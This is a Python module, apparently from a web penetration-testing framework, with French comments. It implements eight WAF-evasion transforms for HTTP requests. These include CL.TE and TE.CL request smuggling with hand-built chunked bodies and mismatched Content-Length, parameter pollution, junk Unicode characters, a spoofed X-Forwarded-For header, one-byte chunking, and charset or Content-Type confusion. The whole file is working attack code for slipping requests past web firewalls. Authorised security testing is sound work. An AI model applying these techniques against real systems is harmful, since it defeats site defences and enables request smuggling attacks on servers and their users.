# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""
Stratégies d'évasion WAF — niveau payload/headers (8 stratégies).

Transforment la structure de la requête sans modifier la sémantique applicative.
Aucune de ces stratégies ne tente de briser la connexion TCP (voir timing.py/protocol.py).
"""
from __future__ import annotations

import uuid
from typing import Any
from urllib.parse import quote, urlencode, urlparse, urlunparse, parse_qsl

from hdwp.core.model.schemas import NormalizedRequest
from hdwp.core.payloads.waf_bypass.bypass_registry import BypassResult, BypassStrategy


def _whitespace_variation(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    new_headers = dict(request.headers)
    new_headers["X-Forwarded-For"] = "127.0.0.1\t"

    new_body = request.body
    if isinstance(request.body, str):
        new_body = request.body.replace(" ", "\t")
    elif isinstance(request.body, dict):
        new_body = {k: v.replace(" ", "\t") if isinstance(v, str) else v
                    for k, v in request.body.items()}

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers, "body": new_body}),
    )


def _junk_char(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    junk = "­‌"
    inject_pos: int = params.get("inject_pos", 1)

    new_query = dict(request.query_params)
    new_body = request.body

    if new_query:
        first_key = next(iter(new_query))
        val = new_query[first_key]
        new_query[first_key] = val[:inject_pos] + junk + val[inject_pos:]
    elif isinstance(request.body, dict) and request.body:
        new_body = dict(request.body)
        first_key = next(iter(new_body))
        val = str(new_body[first_key])
        new_body[first_key] = val[:inject_pos] + junk + val[inject_pos:]

    return BypassResult(
        request=request.model_copy(update={"query_params": new_query, "body": new_body}),
    )


def _cl_te_smuggling(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    smuggled_prefix: str = params.get(
        "smuggled_prefix", "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
    )
    body_bytes = b""
    if isinstance(request.body, str):
        body_bytes = request.body.encode()
    elif isinstance(request.body, bytes):
        body_bytes = request.body

    chunk = body_bytes
    raw = (
        f"{len(chunk):x}\r\n".encode()
        + chunk
        + b"\r\n0\r\n\r\n"
        + smuggled_prefix.encode()
    )

    new_headers = dict(request.headers)
    new_headers["Transfer-Encoding"] = "chunked "  # trailing space — obfuscation TE header
    new_headers["Content-Length"] = str(len(body_bytes))

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
        raw_override=raw,
    )


def _te_cl_smuggling(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    body_bytes = b""
    if isinstance(request.body, str):
        body_bytes = request.body.encode()
    elif isinstance(request.body, bytes):
        body_bytes = request.body

    chunk = body_bytes
    raw = f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n0\r\n\r\n"

    new_headers = dict(request.headers)
    new_headers["Transfer-Encoding"] = "chunked"
    # Content-Length délibérément plus court que le body réel
    new_headers["Content-Length"] = str(max(0, len(body_bytes) - 1))

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
        raw_override=raw,
    )


def _hpp(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    target_param: str | None = params.get("target_param")
    safe_value: str = params.get("safe_value", "1")

    existing = list(parse_qsl(
        "&".join(f"{k}={v}" for k, v in request.query_params.items()),
        keep_blank_values=True,
    ))

    if target_param is None and existing:
        target_param = existing[0][0]

    if target_param is None:
        return BypassResult(request=request)

    # Construire manuellement pour préserver les clés dupliquées — valeurs URL-encodées
    payload_value = request.query_params.get(target_param, safe_value)
    pairs = [(k, v) for k, v in existing if k != target_param]
    pairs = [(target_param, safe_value), (target_param, payload_value)] + pairs

    parsed = urlparse(request.url)
    new_qs = "&".join(f"{quote(k, safe='')}={quote(v, safe='')}" for k, v in pairs)
    new_url = urlunparse(parsed._replace(query=new_qs))

    return BypassResult(
        request=request.model_copy(update={"url": new_url}),
    )


def _multipart_boundary(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    boundary = f"------FormBoundary{uuid.uuid4().hex[:16]}"
    parts: list[str] = []

    if isinstance(request.body, dict):
        for key, value in request.body.items():
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                f"{value}"
            )
    else:
        raw_value = request.body if request.body is not None else ""
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="data"\r\n\r\n'
            f"{raw_value}"
        )

    new_body = "\r\n".join(parts) + f"\r\n--{boundary}--\r\n"
    new_headers = dict(request.headers)
    new_headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers, "body": new_body}),
    )


def _chunked_abuse(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    chunk_size: int = max(1, params.get("chunk_size", 1))

    body_bytes = b""
    if isinstance(request.body, str):
        body_bytes = request.body.encode()
    elif isinstance(request.body, bytes):
        body_bytes = request.body

    chunks = [body_bytes[i:i + chunk_size] for i in range(0, len(body_bytes), chunk_size)]
    raw = b""
    for chunk in chunks:
        raw += f"{len(chunk):x};waf=bypass\r\n".encode() + chunk + b"\r\n"
    raw += b"0\r\n\r\n"

    new_headers = dict(request.headers)
    new_headers["Transfer-Encoding"] = "chunked"

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
        raw_override=raw,
    )


def _content_type_confusion(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    mode: str = params.get("confusion_mode", "ebcdic_hint")
    new_headers = dict(request.headers)
    new_body = request.body

    if mode == "xml_facade":
        new_headers["Content-Type"] = "text/xml; charset=utf-8"
    elif mode == "form_encoded":
        new_headers["Content-Type"] = "application/x-www-form-urlencoded"
        if isinstance(request.body, dict):
            new_body = urlencode(request.body)
    else:
        # ebcdic_hint (défaut)
        existing_ct = new_headers.get("Content-Type", "application/json")
        if "; charset=" not in existing_ct:
            new_headers["Content-Type"] = existing_ct + "; charset=ibm037"

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers, "body": new_body}),
    )


EVASION_STRATEGIES: list[BypassStrategy] = [
    BypassStrategy(
        name="whitespace_variation",
        category="evasion",
        apply=_whitespace_variation,
        description="Remplace les espaces par des tabs dans le body, ajoute X-Forwarded-For avec tab",
        risk_level="low",
    ),
    BypassStrategy(
        name="junk_char",
        category="evasion",
        apply=_junk_char,
        description="Injecte soft-hyphen + zero-width non-joiner dans le premier paramètre",
        risk_level="low",
    ),
    BypassStrategy(
        name="cl_te_smuggling",
        category="evasion",
        apply=_cl_te_smuggling,
        description="HTTP request smuggling CL.TE: Transfer-Encoding avec trailing space",
        risk_level="high",
        requires_special_execution=True,
    ),
    BypassStrategy(
        name="te_cl_smuggling",
        category="evasion",
        apply=_te_cl_smuggling,
        description="HTTP request smuggling TE.CL: Content-Length délibérément trop court",
        risk_level="high",
        requires_special_execution=True,
    ),
    BypassStrategy(
        name="hpp",
        category="evasion",
        apply=_hpp,
        description="HTTP Parameter Pollution: duplique le paramètre cible dans la query string",
        risk_level="low",
    ),
    BypassStrategy(
        name="multipart_boundary",
        category="evasion",
        apply=_multipart_boundary,
        description="Reformate le body en multipart/form-data avec boundary aléatoire",
        risk_level="medium",
    ),
    BypassStrategy(
        name="chunked_abuse",
        category="evasion",
        apply=_chunked_abuse,
        description="Décompose le body en chunks de 1 byte avec extensions ;waf=bypass",
        risk_level="medium",
        requires_special_execution=True,
    ),
    BypassStrategy(
        name="content_type_confusion",
        category="evasion",
        apply=_content_type_confusion,
        description="Modifie le Content-Type (ebcdic_hint, xml_facade, form_encoded)",
        risk_level="low",
    ),
]
